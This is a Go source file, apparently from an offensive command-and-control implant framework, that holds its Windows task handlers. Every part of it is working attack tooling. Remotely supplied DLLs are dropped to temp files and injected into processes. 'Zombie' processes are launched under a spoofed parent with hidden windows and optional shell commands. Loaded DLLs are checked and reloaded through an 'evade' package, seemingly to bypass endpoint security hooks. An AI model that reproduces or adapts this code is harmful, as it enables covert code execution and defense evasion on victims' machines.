//go:build windows
// +build windows

package task

import (
	"bytes"
	"context"
	"os"
	"strings"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/evade"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
)

func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	o, err := evade.CheckDLL(s)
	if err != nil {
		return err
	}
	return w.WriteBool(o)
}
func taskReload(_ context.Context, r data.Reader, _ data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	if err = evade.ReloadDLL(s); err != nil {
		return err
	}
	return nil
}
func taskInject(x context.Context, r data.Reader, w data.Writer) error {
	d, z, v, err := DLLUnmarshal(x, r)
	if err != nil {
		return err
	}
	if err = d.Start(); err != nil {
		if v {
			os.Remove(d.Path)
		}
		return err
	}
	h, _ := d.Handle()
	if w.WriteUint64(uint64(h)); !z {
		if w.WriteUint64(uint64(d.Pid()) << 32); v {
			go func() {
				if bugtrack.Enabled {
					defer bugtrack.Recover("task.taskInject.func1()")
				}
				d.Wait()
				os.Remove(d.Path)
			}()
		} else {
			d.Release()
		}
		return nil
	}
	w.WriteUint32(d.Pid())
	if err = d.Wait(); v {
		os.Remove(d.Path)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	c, _ := d.ExitCode()
	w.WriteInt32(c)
	return nil
}
func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
	z, f, v, err := ZombieUnmarshal(x, r)
	if err != nil {
		return err
	}
	if f {
		w.WriteUint64(0)
		z.Stdout, z.Stderr = w, w
	}
	if err = z.Start(); err != nil {
		if z.Stdout, z.Stderr = nil, nil; v {
			os.Remove(z.Path)
		}
		return err
	}
	if z.Stdin = nil; !f {
		if w.WriteUint64(uint64(z.Pid()) << 32); v {
			go func() {
				if bugtrack.Enabled {
					defer bugtrack.Recover("task.taskZombie.func1()")
				}
				z.Wait()
				os.Remove(z.Path)
			}()
		} else {
			z.Release()
		}
		return nil
	}
	i := z.Pid()
	if err = z.Wait(); v {
		os.Remove(z.Path)
	}
	z.Stdout, z.Stderr = nil, nil
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = z.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	o := s.Payload()
	o[0], o[1], o[2], o[3] = byte(i>>24), byte(i>>16), byte(i>>8), byte(i)
	o[4], o[5], o[6], o[7] = byte(c>>24), byte(c>>16), byte(c>>8), byte(c)
	return nil
}

// DLLUnmarshal will read this DLL's struct data from the supplied reader and
// returns a DLL runnable struct along with the wait and delete status booleans.
//
// This function returns an error if building or reading fails or if the device
// is not running Windows.
func DLLUnmarshal(x context.Context, r data.Reader) (*cmd.DLL, bool, bool, error) {
	var d DLL
	if err := d.UnmarshalStream(r); err != nil {
		return nil, false, false, err
	}
	if len(d.Data) == 0 && len(d.Path) == 0 {
		return nil, false, false, cmd.ErrEmptyCommand
	}
	p := d.Path
	if len(d.Data) > 0 {
		f, err := os.CreateTemp("", execB)
		if err != nil {
			return nil, false, false, err
		}
		_, err = f.Write(d.Data)
		if f.Close(); err != nil {
			os.Remove(f.Name())
			return nil, false, false, err
		}
		p = f.Name()
	}
	v := cmd.NewDllContext(x, p)
	v.Timeout = d.Timeout
	v.SetParent(d.Filter)
	return v, d.Wait, d.Path != p, nil
}

// ZombieUnmarshal will read this Zombies's struct data from the supplied reader
// and returns a Zombie runnable struct along with the wait and delete status
// booleans.
//
// This function returns an error if building or reading fails or if the device
// is not running Windows.
func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, bool, error) {
	var z Zombie
	if err := z.UnmarshalStream(r); err != nil {
		return nil, false, false, err
	}
	if len(z.Args) == 0 || (len(z.Path) == 0 && len(z.Data) == 0) {
		return nil, false, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewZombieContext(x, nil, z.Args...)
	if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'S' && z.Args[0][5] == 'L' {
		v.Args = []string{device.Shell, device.ShellArgs, strings.Join(z.Args[1:], " ")}
	}
	if v.SetFlags(z.Flags); z.Hide {
		v.SetNoWindow(true)
		v.SetWindowDisplay(0)
	}
	if v.SetParent(z.Filter); len(z.Stdin) > 0 {
		v.Stdin = bytes.NewReader(z.Stdin)
	}
	if v.Timeout, v.Dir, v.Env = z.Timeout, z.Dir, z.Env; !z.IsDLL {
		if len(v.Data) > 0 {
			v.Data = z.Data
		} else {
			v.Path = z.Path
		}
		return v, z.Wait, false, nil
	}
	if len(z.Data) == 0 {
		// NOTE(dij): Sanity check, shouldn't happen here.
		return nil, false, false, cmd.ErrEmptyCommand
	}
	f, err := os.CreateTemp("", execB)
	if err != nil {
		return nil, false, false, err
	}
	_, err = f.Write(z.Data)
	if f.Close(); err != nil {
		os.Remove(f.Name())
		return nil, false, false, err
	}
	v.Path = f.Name()
	return v, z.Wait, true, nil
}
